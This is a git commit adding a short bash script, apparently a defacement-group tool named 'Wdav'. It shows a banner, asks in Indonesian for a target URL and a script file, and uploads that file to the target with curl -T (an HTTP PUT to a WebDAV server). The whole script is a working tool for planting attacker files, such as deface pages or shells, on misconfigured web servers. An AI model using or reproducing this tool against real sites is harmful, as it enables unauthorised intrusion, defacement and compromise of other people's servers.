b0f2b4f6ba32f7d93c273bbb3991f96f02e4e08a
nvyonca <49239403+nvyonca@users.noreply.github.com>
2019-04-03 20:18:35 +0700

    Add files via upload

---
+++ wdav.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+figlet -f Bigfig MyWdav | lolcat
+
+echo""
+echo "____________________________ "
+echo " Create by : Nvy'onca "
+echo " Team      : Beauty Cyber Squard"
+echo " Tools     : Wdav "
+echo "____________________________ "
+echo ""
+read -p " Masukan target : " bau
+read -p " Masukin Script anda : " sc
+curl -T /storage/emulated/0/$sc $bau
+echo ""
+echo "{•}>>> [ $bau/$sc ] "
